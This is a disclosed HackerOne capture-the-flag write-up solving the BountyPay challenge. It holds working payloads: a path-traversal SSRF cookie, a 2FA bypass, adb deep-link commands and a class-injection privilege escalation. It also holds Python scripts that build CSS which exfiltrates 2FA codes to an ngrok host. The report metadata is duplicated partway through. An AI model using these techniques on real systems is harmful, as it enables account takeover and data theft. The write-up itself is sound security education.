---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
substate: "resolved"
weakness: null
enriched: true
body: true
date: 2020-06-18
submitted: 2020-05-31T08:44:50.216Z
bounty_usd: null
votes: 64
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "zeroxyele"
source: "https://hackerone.com/reports/887818"
title: "[H1-2006 2020] I successfully solved it!"
---
# [H1-2006 2020] I successfully solved it!

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 64 | **Program:** h1-ctf | **Disclosed:** 2020-06-18

- Report: [https://hackerone.com/reports/887818](https://hackerone.com/reports/887818)
- CWE: N/A
- Submitted: 2020-05-31T08:44:50.216Z

## Report summary

Update: After recent markdown changes on HackerOne, attachments/images were broken. So I had to comment the writeup, you can read it down below.

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hello,
I'll get post there the write-up soon. Here is flag: `^FLAG^736c635d8842751b8aafa556154eb9f3$FLAG---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - env/web
substate: "resolved"
weakness: null
enriched: true
date: 2020-06-18
submitted: 2020-05-31T08:44:50.216Z
bounty_usd: null
votes: 64
cve: []
program: "[[programs/h1-ctf|h1-ctf]]"
reporter: "zeroxyele"
source: "https://hackerone.com/reports/887818"
title: "[H1-2006 2020] I successfully solved it!"
---
# [H1-2006 2020] I successfully solved it!

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 64 | **Program:** h1-ctf | **Disclosed:** 2020-06-18

- Report: [https://hackerone.com/reports/887818](https://hackerone.com/reports/887818)
- CWE: N/A
- Submitted: 2020-05-31T08:44:50.216Z

## Report summary

Update: After recent markdown changes on HackerOne, attachments/images were broken. So I had to comment the writeup, you can read it down below.


Sincerely,
@zeroxyele

## Impact

null

## Timeline

- **Report Filed**
- **2020-06-01** @zeroxyele: the attachments. going to complete the write-up soon.
- **2020-06-02** @zeroxyele: more attachments
- **2020-06-03** @zeroxyele: more attachments
- **2020-06-06** @zeroxyele: more attachments
- **2020-06-06** @zeroxyele: more attachments
- **2020-06-07** @zeroxyele: more attachments
- **2020-06-08** @zeroxyele: more attachments
- **Report Triaged**
- **2020-06-08** @zeroxyele: Hey, it is possible to update the title to "H1-2006 Writeup"?
- **Report Title Updated**
- **2020-06-09** @zeroxyele: more attachments
- **2020-06-11** @nahamsec: Hello,

I wanted to personally thank you for participating in the #h12006 2020 CTF, I hope you enjoyed the challenge! We received tons of great submission and it definitely made our decision a lot harder than we excepted. Unfortunately, since we only have a limited number of invites available, your write up was not selected for this event. We appreciate your hard work and we hope to see you participate in our next CTF!

We will send you a request to publicly disclose your submissions next week, so please hold on to your writeups, we'll make sure to let you know when you can publish them on your site!

If you were one of the first 10 people to submit a write-up,  look out for some private invite in the next few days!
- **2020-06-11** @zeroxyele: I'm glad to being participator of this community and this CTF. It was fun, thanks! :)
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2021-08-21** @zeroxyele: ## Beginning of the event
HackerOne's official twitter account posted a tweet on May 29th about Marten has to approve May bug bounty payments but he lost his login details. So I decided to make a research about BountyPay to help him. Beyond the research, I made an automated script that exploits all the vulnerabilities needs to approve May bounties. So if Marten lost his credentials again, what he should do is just run the script :)

### autoFlag.py
{F850812}
{F850817}

## Asset Discovery
I started to look for the subdomains during the scope is `*.bountypay.h1ctf.com` and found a few subdomains.
https://crt.sh/?q=%25.bountypay.h1ctf.com
```
api.bountypay.h1ctf.com
app.bountypay.h1ctf.com
software.bountypay.h1ctf.com
staff.bountypay.h1ctf.com
www.bountypay.h1ctf.com
```
Beyond to that, I've checked the other tools that look for many web sources but didn't get any other results.
{F850835}

## Content Discovery
After I've got the assets, I started to discover contents via ffuf tool (github.com/ffuf/ffuf) and I've been looking for what's going on here.

- software.bountypay.h1ctf.com

{F850866}
When I've entered the page, I faced with a message that says my IP address is not allowed to access there. I've tried to access there via the `X-Forwarded-For: 127.0.0.1` method but it didn't work. So I noted this and continued the research.

```
[401] /
```
- www.bountypay.h1ctf.com

{F850869}
There was nothing worth looking at this subdomain except the twitter account linked at the page that has something that would interest us. Also, the follow button was linked to @bugbountyhq twitter account. I noted this and continued the research.
```
[200] /
[403] /css/
[403] /js/
[403] /images/
```
- staff.bountypay.h1ctf.com

{F850881}
The website was redirecting all requests to `/?template=login` during we are unauthorized. 
```
[302] /
[302] /?template=home
[200] /?template=login
[403] /css/
[403] /js/
[403] /images/
```
During to fuzzing the `template` parameter, I've found another template named `admin`. I was not able to access this template until we get authorized.
{F850889}

- api.bountypay.h1ctf.com

{F850898}
I think the APIs are the most critical part of recon&attack and during my tests, I really love to attack the APIs. At the main page of the API, there was a link which is `/redirect?url=https://www.google.com/search?q=REST+API` it means redirect endpoint has a parameter `url`
```
[200] /
[200] /redirect
[403] /css/
[403] /js/
[403] /images/
```
After I've found the redirect endpoint, I've fuzzed it and discovered which URLs is whitelisted (maybe it can be useful during the attack):
```
https://www.google.com/search?q=
https://www.bountypay.h1ctf.com/
https://api.bountypay.h1ctf.com/
https://staff.bountypay.h1ctf.com/
https://software.bountypay.h1ctf.com/
```
- app.bountypay.h1ctf.com

{F850907}
There was a login page which is almost the same as the staff's one. The directory `.git` looks interesting and worths research!
```
[200] /
[302] /logout
[403] /css/
[403] /js/
[403] /images/
[403] /.git/
[200] /.git/description
[200] /.git/config
[200] /.git/HEAD
[200] /.git/index
[200] /.git/packed-refs
```

## Exposed log file leaks the credentials
Since I've discovered `.git` directory at the `app` subdomain, I performed a couple of GET requests to the files under the directory. Then got a GitHub link `https://github.com/bounty-pay-code/request-logger.git` from `/.git/config` file . 
{F852427}
When I get into the repository, there was a PHP code that logs all requests it comes to `bp_web_trace.log` file. 
{F852434}
So I've visited `/bp_web_trace.log` file then got base64 encoded logs:
```
1588931909:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJHRVQiLCJQQVJBTVMiOnsiR0VUIjpbXSwiUE9TVCI6W119fQ==
1588931919:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIn19fQ==
1588931928:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC8iLCJNRVRIT0QiOiJQT1NUIiwiUEFSQU1TIjp7IkdFVCI6W10sIlBPU1QiOnsidXNlcm5hbWUiOiJicmlhbi5vbGl2ZXIiLCJwYXNzd29yZCI6IlY3aDBpbnpYIiwiY2hhbGxlbmdlX2Fuc3dlciI6ImJEODNKazI3ZFEifX19
1588931945:eyJJUCI6IjE5Mi4xNjguMS4xIiwiVVJJIjoiXC9zdGF0ZW1lbnRzIiwiTUVUSE9EIjoiR0VUIiwiUEFSQU1TIjp7IkdFVCI6eyJtb250aCI6IjA0IiwieWVhciI6IjIwMjAifSwiUE9TVCI6W119fQ==
```
Then I've decoded the base64 values and got some credentials!
```json
{"IP":"192.168.1.1","URI":"\/","METHOD":"GET","PARAMS":{"GET":[],"POST":[]}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX"}}}
{"IP":"192.168.1.1","URI":"\/","METHOD":"POST","PARAMS":{"GET":[],"POST":{"username":"brian.oliver","password":"V7h0inzX","challenge_answer":"bD83Jk27dQ"}}}
{"IP":"192.168.1.1","URI":"\/statements","METHOD":"GET","PARAMS":{"GET":{"month":"04","year":"2020"},"POST":[]}}
```
Username: `brian.oliver`, Password: `V7h0inzX`

## Getting logged in and 2FA bypass
After I've got the credentials, I just tried to log-in. Then the credential we got was working but there was the 2FA which I had to bypass. At that moment, I realized there was `challange_answer` at the log file but it didn't work. After a couple of minutes of working with the request, I realized the value of `challenge` parameter must be equal to `md5(challenge answer)`, so the pseudo-code was like this:
```python
get_parameters(username,password,challenge,challenge_answer)
if login(username,password) and (md5(challenge_answer) == challenge):
    return True
else:
    return False
```
Firstly I got md5 value of `123` which is `202cb962ac59075b964b07152d234b70` and put it to value of the  `challenge` parameter then put `123` to the value of `challenge_answer` parameter. It worked!
```
username=brian.oliver&password=V7h0inzX&challenge=202cb962ac59075b964b07152d234b70&challenge_answer=123
```
{F852431}

## Jumping to the internal host via Path Traversal & Open Redirect & SSRF
After I've logged in, the page was really simple and I was only able to access the `Load Transactions` function. The button was sending an interesting request to `/statements?month={month}&year={year}.` and parsing the JSON by the value of the key `data` then display the transactions on the screen.
```json
{
"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/F8gHiqSdpK\/statements?month=01&year=2020",
"data":"{\"description\":\"Transactions for 2020-01\",\"transactions\":[]}"
}
```
{F852435}
Beyond that, there was another key that gets me interested: there was `url` key at the response which means it was sending a request then giving us the response with `data`. A few minutes later, I noticed our session token is encoded with base64 and I directly decoded it:
```json
{"account_id":"F8gHiqSdpK","hash":"de235bffd23df6995ad4e0930baac1a2"}
```
Wait, what? Isn't it the id that it sends with the `statements` endpoint?
{F852429}
{F852426}
There were only three inputs we can control, but the month and year were not strictly under our control. So I just tried a couple of things with `account_id` because it was directly putting the value to the URL without verifying it due to hash and sends the request to the API. So benefiting with path traversal I made a payload to exploit this:
```json
{
"account_id":"../../redirect?url=https://software.bountypay.h1ctf.com/#",
"hash":"de235bffd23df6995ad4e0930baac1a2"
}
```
I've encoded it with base64 and put it to the cookie. Then I've sent the request and boom! So I was able to access `software.bountypay.h1ctf.com` via SSRF (which sends GET request). 
```json
{
"url":"https:\/\/api.bountypay.h1ctf.com\/api\/accounts\/..\/..\/redirect?url=https:\/\/software.bountypay.h1ctf.com\/#\/statements?month=04&year=2020",
"data":"<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n    <title>Software Storage<\/title>\n    <link href=\"\/css\/bootstrap.min.css\" rel=\"stylesheet\">\n<\/head>\n<body>\n\n<div class=\"container\">\n    <div class=\"row\">\n        <div class=\"col-sm-6 col-sm-offset-3\">\n            <h1 style=\"text-align: center\">Software Storage<\/h1>\n            <form method=\"post\" action=\"\/\">\n                <div class=\"panel panel-default\" style=\"margin-top:50px\">\n                    <div class=\"panel-heading\">Login<\/div>\n                    <div class=\"panel-body\">\n                        <div style=\"margin-top:7px\"><label>Username:<\/label><\/div>\n                        <div><input name=\"username\" class=\"form-control\"><\/div>\n                        <div style=\"margin-top:7px\"><label>Password:<\/label><\/div>\n                        <div><input name=\"password\" type=\"password\" class=\"form-control\"><\/div>\n                    <\/div>\n                <\/div>\n                <input type=\"submit\" class=\"btn btn-success pull-right\" value=\"Login\">\n            <\/form>\n        <\/div>\n    <\/div>\n<\/div>\n<script src=\"\/js\/jquery.min.js\"><\/script>\n<script src=\"\/js\/bootstrap.min.js\"><\/script>\n<\/body>\n<\/html>"
}
```
Unfortunately, it needs to log-in via POST to access storage but we are not able to send POST request. For discovering more content at this host, I've started to directory/file brute-forcing via [my wordlist](https://gist.github.com/xyele/adcae59400cb516e5b81d9a93939b309) using by Burp Suite Intruder (Thanks to PortSwigger for Payload Processing feature) 
{F852425}
{F852442}
After my intruder was trying a couple of thousand requests, I got an APK file under /uploads directory but getting the file over SSRF would be a bit boring. Luckily it was possible to access directly to file. 
{F853198}

## Diving into the Android APP
So I've downloaded the file [the file](https://software.bountypay.h1ctf.com/uploads/BountyPay.apk) then started some reverse-engineering stuff. The first thing that I do while researching for any APK file is decompiling the app (via jadx) and looking for what's going on with the `AndroidManifest.xml` file. I determined there are deep links defined for PartOneActivity,PartTwoActivity,PartThreeActivity activities that may be useful. Let's run the app and see what's going on.

```xml
<application android:theme="@style/AppTheme" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:debuggable="true" android:allowBackup="true" android:supportsRtl="true" android:networkSecurityConfig="@xml/network_security_config" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
	<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_congrats" android:name="bounty.pay.CongratsActivity"/>
	<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_three" android:name="bounty.pay.PartThreeActivity">
		<intent-filter android:label="">
			<action android:name="android.intent.action.VIEW"/>
			<category android:name="android.intent.category.DEFAULT"/>
			<category android:name="android.intent.category.BROWSABLE"/>
			<data android:scheme="three" android:host="part"/>
		</intent-filter>
	</activity>
	<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_two" android:name="bounty.pay.PartTwoActivity">
		<intent-filter android:label="">
			<action android:name="android.intent.action.VIEW"/>
			<category android:name="android.intent.category.DEFAULT"/>
			<category android:name="android.intent.category.BROWSABLE"/>
			<data android:scheme="two" android:host="part"/>
		</intent-filter>
	</activity>
	<activity android:theme="@style/AppTheme.NoActionBar" android:label="@string/title_activity_part_one" android:name="bounty.pay.PartOneActivity">
		<intent-filter android:label="">
			<action android:name="android.intent.action.VIEW"/>
			<category android:name="android.intent.category.DEFAULT"/>
			<category android:name="android.intent.category.BROWSABLE"/>
			<data android:scheme="one" android:host="part"/>
		</intent-filter>
	</activity>
	<activity android:name="bounty.pay.MainActivity">
		<intent-filter>
			<action android:name="android.intent.action.MAIN"/>
			<category android:name="android.intent.category.LAUNCHER"/>
		</intent-filter>
	</activity>
</application>
```
So I just started the app with GenyMotion. There were two inputs here, I just filled them and submitted and passed to Part One.
{F853449}
At Part One, there was a blank page and the icon of the application in the bottom right. Clicked it and got two hints: `Deeplinks` and `params`.
{F857269}
We already have determined deep links. So I decided to inspect the source code of this activity and found this interesting if statement.
```java
if (getIntent() != null && getIntent().getData() != null && (firstParam = getIntent().getData().getQueryParameter("start")) != null && firstParam.equals("PartTwoActivity") && settings.contains("USERNAME")) {
  String user = settings.getString("USERNAME", "");
  SharedPreferences.Editor editor = settings.edit();
  String twitterhandle = settings.getString("TWITTERHANDLE", "");
  editor.putString("PARTONE", "COMPLETE").apply();
  logFlagFound(user, twitterhandle);
  startActivity(new Intent(this, PartTwoActivity.class));
}
```
The condition we must supply is if `start` parameter equals `PartTwoActivity`. So after some google searches, I learned we can start intent with parameter on deep links via adb activity manager (am). [Here](https://developer.android.com/studio/command-line/adb#IntentSpec) is the argument list of am it is quite useful. I got adb shell and ran this command.
```
am start -a android.intent.action.VIEW -n bounty.pay/.PartOneActivity -d "one://part?start=PartTwoActivity"
```
Here we go! We are at Part Two and it needs if parameter `two` equals to `light` and parameter `switch` equals to `on` (to display the elements).
{F857270}
```java
if (getIntent() != null && getIntent().getData() != null) {
  Uri data = getIntent().getData();
  String firstParam = data.getQueryParameter("two");
  String secondParam = data.getQueryParameter("switch");
  if (firstParam != null && firstParam.equals("light") && secondParam != null && secondParam.equals("on")) {
    editText.setVisibility(0);
    button.setVisibility(0);
    textview.setVisibility(0);
  }
}
```
So I ran this command it meets all the conditions.
```
am start -a android.intent.action.VIEW -n bounty.pay/.PartTwoActivity -d "two://part?two=light&switch=on"
```
Since I've run the activity with valid parameters, I was able to see the elements. There was also a hash `459a6f79ad9b13cbcb5f692d2cc7a94d` which equals to `Token`.
{F857271}
When I checked the source code, it checks if the string that we entered to the input starts with "X-". So I thought it may be `X-Token` and it worked! I passed part two :)
```java
if (str.equals("X-" + ((String) dataSnapshot.getValue()))) {
  PartTwoActivity.this.logFlagFound(settings.getString("USERNAME", ""), settings.getString("TWITTERHANDLE", ""));
  editor.putString("PARTTWO", "COMPLETE").apply();
  PartTwoActivity.this.correctHeader();
  return;
}
```
At this part, we are really close to the end. There were two hints again: `Reuse some params`,`Intercept or check for leaks`
{F857268}
Here is the code which controls/checks for parameters. The condition we must supply is if `three` parameter equals `base64encode("PartThreeActivity")`, the `switch` parameter is `base64encode("on")` and the `header` parameter equals to `X-Token`
```java
if (getIntent() != null && getIntent().getData() != null) {
 Uri data = getIntent().getData();
 final String firstParam = data.getQueryParameter("three");
 final String secondParam = data.getQueryParameter("switch");
 final String secondParam2 = data.getQueryParameter("header");
 byte[] decodeFirstParam = Base64.decode(firstParam, 0);
 byte[] decodeSecondParam = Base64.decode(secondParam, 0);
 final String decodedFirstParam = new String(decodeFirstParam, StandardCharsets.UTF_8);
 final String decodedSecondParam = new String(decodeSecondParam, StandardCharsets.UTF_8);
 this.childRefThree.addListenerForSingleValueEvent(new ValueEventListener() {
  /* class bounty.pay.PartThreeActivity.AnonymousClass5 */

  @Override // com.google.firebase.database.ValueEventListener
  public void onDataChange(DataSnapshot dataSnapshot) {
   String str;
   String value = (String) dataSnapshot.getValue();
   if (firstParam != null && decodedFirstParam.equals("PartThreeActivity") && secondParam != null && decodedSecondParam.equals("on") && (str = secondParam2) != null) {
    if (str.equals("X-" + value)) {
     editText.setVisibility(0);
     button.setVisibility(0);
     PartThreeActivity.this.thread.start();
    }
   }
  }
 });
}
```
So through this condition, I ran this command then I was able to see the elements.
```
am start -a android.intent.action.VIEW -n bounty.pay/.PartThreeActivity -d "three://part?three=UGFydFRocmVlQWN0aXZpdHk%3D&switch=b24%3D&header=X-Token"
```
{F857445}
There were just input and button which wants to me submit a leaked hash. Firstly I've checked my "Burp Suite" for if there are any requests which contain any hash but didn't get anything. Then I checked to see if there are any files or folders used by the application.
```console
root@vbox86p:/ # find / -name "*bounty*"
/data/app/bounty.pay-1
/data/data/bounty.pay
/data/data/bounty.pay/shared_prefs/bounty.pay_preferences.xml
/data/data/bounty.pay/app_sslcache/bountypay-90f64.firebaseio.com.443
root@vbox86p:/ # 
```
Entered to `/data/data/bounty.pay/shared_prefs/` directory and found an interesting file `user_created.xml`.
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="TWITTERHANDLE"></string>
    <string name="USERNAME">xyele</string>
    <string name="PARTONE">COMPLETE</string>
    <string name="PARTTWO">COMPLETE</string>
    <string name="TOKEN">8e9998ee3137ca9ade8f372739f062c1</string>
    <string name="HOST">http://api.bountypay.h1ctf.com</string>
</map>
```
I've submitted the token and completed all levels. And there was another hint at CongratsActivity: `Information leaked here will help with other challenges`.
{F858141}

## Getting staff credentials via API
After I ran across with the API again, I started to dig the API more and found another endpoint: `/api/staff`. Then I performed a `GET` request with `X-Token: 8e9998ee3137ca9ade8f372739f062c1` header and listed the staff.
```json
[
{"name":"Sam Jenkins","staff_id":"STF:84DJKEIP38"},
{"name":"Brian Oliver","staff_id":"STF:KE624RQ2T9"}
]
```
After I got stuck here for a while, I realized there is another function for the same endpoint with a `POST` request and `staff_id` parameter. I tried to put the list what I've got already, but it has returned `Staff Member already has an account` to me.
```http
HTTP/1.1 409 Conflict
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 20:26:14 GMT
Content-Type: application/json
Connection: close
Content-Length: 39

["Staff Member already has an account"]
```
And after stuck at there too for a while,  I noticed the Twitter account I already discovered (thanks to the retweet) has some interesting followings.
{F858366}
{F858367}
Wow, the new worker leaked her staff id via twitter ?!
{F858368}
So I just created an account with this staff id and logged into the staff panel.
```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Token: 8e9998ee3137ca9ade8f372739f062c1
Upgrade-Insecure-Requests: 1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

staff_id=STF:8FJ3KFISL3
```
Response
```http
HTTP/1.1 201 Created
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 07 Jun 2020 20:35:29 GMT
Content-Type: application/json
Connection: close
Content-Length: 110

{"description":"Staff Member Account Created","username":"sandra.allison","password":"s%3D8qB8zEpMnc*xsz7Yp5"}
```
Username: `sandra.allison`, Password: `s%3D8qB8zEpMnc*xsz7Yp5`

## Privilege escalation via JS trick
Since I got logged in, I noticed the account who as we logged in has not permission to access the admin panel.
{F858907}
{F858927}
So I thought how can we escalation to admin and then decided to surf there more. So here are the functions what can Sandra has to access:
- Report Page (/admin/report?url={base64encoded_url})

{F858934}
There was a label "Report This Page" at the footer of the page, which sends our current page to the admin. So the backend (admin) gonna visit our path.
- Ticket View (/?template=ticket&ticket_id=3582)

{F858939}
There was only one ticket and we cannot reply to it because it has disabled. I tried to fuzz the ticket id parameter but it didn't work. Also it reflects our profile name and avatar as well.
/?template=ticket&ticket_id=3582
- Profile Update (POST /?template=home)

{F858941}
It was just possible to update the profile name and avatar there. The avatar that we entered to the parameter was reflected in class on the page.

{F858955}
- Include many templates via Arrays (/?template[]=home&template[]=login)

{F858970}
Wait, what? Yes it is! It was possible to include two templates in one page via arrays.

After surfing there more, I noticed there was a javascript file that looks vulnerable is included on the page.
https://staff.bountypay.h1ctf.com/js/website.js
```js
$(".upgradeToAdmin").click(function() {
    let t = $('input[name="username"]').val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
}), $(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
}), $(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
}), 
document.location.hash.length > 0 && (
"#tab1" === document.location.hash && $(".tab1").trigger("click"),
"#tab2" === document.location.hash && $(".tab2").trigger("click"),
"#tab3" === document.location.hash && $(".tab3").trigger("click"),
"#tab4" === document.location.hash && $(".tab4").trigger("click")
);
```
Here is the explanation of the code:
1 - When the object which has `upgradeToAdmin` class is clicked, the event handler will be triggered and gets username from the input whose name attribute is `username`. Then performs a GET request to upgrade endpoint `/admin/upgrade?username={username}`.
2- When the object which has `sendReport` class is clicked, the event handler will be triggered. When the event handler is triggered, it gets the current path and then performs GET request to the report endpoint `/admin/report?url={url}`.
3- If the fragment string (hash) is `#tab3` (e.g), it clicks the object which has to `tab3` class.

If we change the avatar like `avatar3 tab3 upgradeToAdmin`, the upgrade to admin function will be triggered too (fragment string needs to be `#tab3`). So firstly I changed my avatar via this request:
```http
POST /?template[]=home HTTP/1.1
Host: staff.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Origin: https://staff.bountypay.h1ctf.com
Connection: close
Referer: https://staff.bountypay.h1ctf.com/?template[]=home&template[]=login&username=sandra.allison
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSHV3NVZ0ejc5U0lZdXhyQm5XcXRFcDB5QndHRzJZTlZMV1h3SUhpSGY0NXc1U2dRMEh1SlJUc0tVdUVsaUI0VWlBZmtSVFNIRWZ5bVdFY3U5MWNRb3k2bCtLRUFmUElsdktpYU94K3JLODJJUC9uV1NnPT0%3D
Upgrade-Insecure-Requests: 1

profile_name=sandra&profile_avatar=avatar3+tab3+upgradeToAdmin
```
There was one more problem: the username is undefined that's why it trying to upgrade to admin for `undefined` username.

{F859731}
Since we can include many templates, I included the login template and reflected my username `sandra.allison` to the page like this:
```
/?template[]=login&template[]=ticket&username=sandra.allison&ticket_id=3582
```
So I combined all these things and made this payload:
```
/?template[]=login&template[]=ticket&username=sandra.allison&ticket_id=3582#tab3
```
And encoded it via base64:
```
Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uJnRpY2tldF9pZD0zNTgyI3RhYjM=
```
Then reported the URL to the admin. The admin has opened our payload and I've escalated to admin, got the marten's credentials :)

{F859743}
Username: `marten.mickos`, Password: `h&H5wy2Lggj*kKn4OD&Ype`

## 2FA Bypass via CSS data exfiltration
Finally, we are one step away from the flag. I logged into the app due to Marten's credentials. There had the same 2fa again and bypassed it via the method we already discovered. Then listed the transactions and found unpaid bounties.
{F860444}
Ahh, here we go again :O
{F860445}
I clicked to the `Send challenge` button and there had this weird request.

{F860447}
```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://app.bountypay.h1ctf.com
Connection: close
Referer: https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9
Upgrade-Insecure-Requests: 1

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```
Firstly I tried to SSRF but had no results due it doesn't respond to us the response of the request even though it sends the request. Then I tried too many XSS things but didn't get anything. And then I noticed the extension of the file was CSS. So probably it includes the given CSS on the page it means there is a browser at the backend which loads to he page with given css. The only way to bypass the 2fa is exfiltrating data via injecting malicious CSS.

So I ran the HTTP server thanks to Python. The given URL has to be HTTPS, that's why I used ngrok to made this server public.
{F860491}
Created malicious css file to determine name of the inputs. It uses `^` operator which checks for if the name starts with.
```python
import sys
try:
	known = sys.argv[1]
except:
	known = ""
f = open("evil.css","a")
http_server = "https://d5230ec910f7.ngrok.io"
template = """input[name^="{}"] {{background-image: url("{}/hit_code_{}"); }}\n"""
char_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^*()+-[]{}"
for c in char_list:
	f.write(template.format(known+c,http_server,known+c))
f.close()
```
Here is an example malicious css:
```css
input[name^="a"] {background-image: url("https://http_server/hit_code_a"); }
input[name^="b"] {background-image: url("https://http_server/hit_code_b"); }
input[name^="c"] {background-image: url("https://http_server/hit_code_c"); }
input[name^="d"] {background-image: url("https://http_server/hit_code_d"); }
...
input[name^="["] {background-image: url("https://http_server/hit_code_["); }
input[name^="]"] {background-image: url("https://http_server/hit_code_]"); }
input[name^="{"] {background-image: url("https://http_server/hit_code_{"); }
input[name^="}"] {background-image: url("https://http_server/hit_code_}"); }
```
I ran this script again with adding known character. I determined characters one by one and there are 7 inputs were in page which named as `code_0-7`. Then created and ran another python script for generating another malicious payoad:
```python
f = open("evil.css","a")
http_server = "https://d5230ec910f7.ngrok.io"
template = """input[name="code_{}"][value="{}"] {{background-image: url("{}/hit_code{}_{}"); }}\n"""
char_list = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^*()+-_[]{}"
for n in range(1,8):
	for c in char_list:
		f.write(template.format(n,c,http_server,n,c))
f.close()
```
Then I sent the server to the URL of evil.css and got the 2fa code :)
{F860545}
So I combined them submitted it and got the flag.
{F860547}
## Thanks to
{F858975}
I really learned a lot of things at this CTF and it was really fun. So thanks to @nahamsec, @B3nac, @adamtlangley for this great CTF...
